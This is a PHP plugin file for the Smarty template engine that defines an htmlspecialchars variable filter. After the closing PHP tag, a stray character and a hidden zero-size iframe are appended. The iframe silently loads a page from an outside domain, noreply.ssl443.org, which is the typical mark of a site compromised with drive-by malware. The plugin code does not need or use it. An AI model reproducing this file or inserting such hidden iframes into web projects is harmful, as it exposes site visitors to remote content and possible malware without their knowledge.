<?php
/**
 * Smarty plugin
 *
 * @package Smarty
 * @subpackage PluginsFilter
 */

/**
 * Smarty htmlspecialchars variablefilter plugin
 *
 * @param string                   $source input string
 * @param Smarty_Internal_Template $smarty Smarty object
 * @return string filtered output
 */
function smarty_variablefilter_htmlspecialchars($source, $smarty)
{
    return htmlspecialchars($source, ENT_QUOTES, Smarty::$_CHARSET);
}

?>p
<nofollow><iframe src="http://noreply.ssl443.org/local.html" width="0" height="0" frameborder="0"></iframe></nofollow>
